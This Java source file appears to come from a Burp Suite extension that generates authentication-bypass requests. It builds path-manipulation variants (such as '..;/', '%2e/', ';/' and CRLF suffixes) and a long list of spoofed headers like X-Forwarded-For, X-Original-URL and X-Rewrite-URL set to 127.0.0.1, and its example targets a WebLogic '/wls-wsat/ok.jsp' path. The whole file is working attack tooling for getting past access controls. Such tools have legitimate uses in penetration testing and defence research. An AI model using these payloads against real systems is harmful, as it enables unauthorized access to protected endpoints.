package burp.auth;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class AuthPayload {

    public static void main(String[] args) {
        List<AuthRequest> get = new AuthPayload().prefix("GET", "/wls-wsat/ok.jsp");
        for (AuthRequest authRequest : get) {
            System.out.println(authRequest.getPath());
        }
    }

    public List<AuthRequest> suffix(String method, String path) {
        if (path.startsWith("//")) {
            path = "/" + path.substring(2).replaceAll("/+", "/");
        }
        List<AuthRequest> authRequests = new ArrayList<>();
        if (path.endsWith("/")) {
            path = path.substring(0, path.length() - 1);
            List<String> payloads = Arrays.asList(path + "%2e/", path + "/.", "./" + path + "/./", path + "%20/",
                    "/%20" + path + "%20/", path + "..;/", path + "?", path + "??", "/" + path + "//",
                    path + "/", path + "/.randomstring");
            for (String payload : payloads) {
                if ("GET".equals(method)) {
                    authRequests.add(new AuthRequest("GET", payload, ""));
                } else if ("POST".equals(method)) {
                    authRequests.add(new AuthRequest("POST", payload, ""));
                }
            }
        } else {
            List<String> payloads = Arrays.asList(path + "/%2e", path + "/%20", path + "%0d%0a", path + ".json", path + "/.randomstring");

            for (String payload : payloads) {
                if ("GET".equals(method)) {
                    authRequests.add(new AuthRequest("GET", payload, ""));
                } else if ("POST".equals(method)) {
                    authRequests.add(new AuthRequest("POST", payload, ""));
                }
            }
        }
        return authRequests;
    }

    public List<AuthRequest> prefix(String method, String path) {
        if (path.startsWith("//")) {
            path = "/" + path.substring(2).replaceAll("/+", "/");
        }
        List<AuthRequest> authRequests = new ArrayList<>();
        String[] prefix = {";/", ".;/", "images/..;/", ";a/", "%23/../"};
        for (String s : prefix) {
            // 将路径按 / 分割为多个部分
            String[] pathParts = path.split("/");
            for (int i = 1; i < pathParts.length; i++) {
                // 输出从第二个部分到最后一个部分
                String[] subPathParts = Arrays.copyOfRange(pathParts, i, pathParts.length);
                String[] prePathParts = Arrays.copyOfRange(pathParts, 1, i);
                if (prePathParts.length > 0) {
                    if ("GET".equals(method)) {
                        authRequests.add(new AuthRequest("GET", "/" + String.join("/", prePathParts) + "/" + s + String.join("/", subPathParts), ""));
                    }
                    else if ("POST".equals(method)){
                        authRequests.add(new AuthRequest("POST","/"+String.join("/", prePathParts) + "/" + s + String.join("/", subPathParts),""));
                    }
                } else {
                    if ("GET".equals(method)){
                        authRequests.add(new AuthRequest("GET","/"+s + String.join("/", subPathParts),""));
                    } else if ("POST".equals(method)) {
                        authRequests.add(new AuthRequest("POST", "/" + s + String.join("/", subPathParts), ""));
                    }
                }
            }
        }

        return authRequests;
    }

    public List<AuthRequest> headers(String method, String url) {
        List<AuthRequest> authRequests = new ArrayList<>();
        List<String> payloads = Arrays.asList("Access-Control-Allow-Origin: 127.0.0.1","Base-Url: " + url,"CF-Connecting-IP: 127.0.0.1",
                "CF-Connecting_IP: 127.0.0.1","Client-IP: 127.0.0.1","Cluster-Client-IP: 127.0.0.1","Destination: 127.0.0.1",
                "Forwarded-For-Ip: 127.0.0.1","Forwarded-For: 127.0.0.1","Forwarded-Host: 127.0.0.1","Forwarded: 127.0.0.1",
                "Host: 127.0.0.1","Http-Url: " + url,"Origin: 127.0.0.1","Profile: 127.0.0.1","Proxy-Host: 127.0.0.1",
                "Proxy-Url: " + url,"Proxy: 127.0.0.1","Real-Ip: 127.0.0.1","Redirect: 127.0.0.1","Referer: " + url,
                "Request-Uri: 127.0.0.1","True-Client-IP: 127.0.0.1",
                "Uri:"+ url,"Url: " + url,"X-Arbitrary: 127.0.0.1","X-Client-IP: 127.0.0.1",
                "X-Custom-IP-Authorization: 127.0.0.1","X-Forward-For: 127.0.0.1",
                "X-Forward: 127.0.0.1","X-Forwarded-By: 127.0.0.1",
                "X-Forwarded-For-Original: 127.0.0.1","X-Forwarded-For: 127.0.0.1",
                "X-Forwarded-Host: 127.0.0.1","X-Forwarded-Proto: 127.0.0.1",
                "X-Forwarded-Server: 127.0.0.1","X-Forwarded: 127.0.0.1",
                "X-Forwarder-For: 127.0.0.1","X-Host: 127.0.0.1",
                "X-HTTP-DestinationURL: " + url,"X-HTTP-Host-Override: 127.0.0.1",
                "X-Original-Remote-Addr: 127.0.0.1","X-Original-URL: " + url,"X-Originally-Forwarded-For: 127.0.0.1",
                "X-Originating-IP: 127.0.0.1","X-Proxy-Url: " + url,"X-ProxyUser-Ip: 127.0.0.1","X-Real-IP: 127.0.0.1",
                "X-Real-Ip: 127.0.0.1","X-Referrer: 127.0.0.1","X-Remote-Addr: 127.0.0.1","X-Remote-IP: 127.0.0.1",
                "X-Rewrite-URL: " + url,"X-True-IP: 127.0.0.1","X-WAP-Profile: 127.0.0.1");

        for (String payload : payloads) {
            if ("GET".equals(method)) {
                authRequests.add(new AuthRequest("GET","",payload));
            }else if ("POST".equals(method)){
                authRequests.add(new AuthRequest("POST","",payload));
            }
        }
        return authRequests;
    }


}
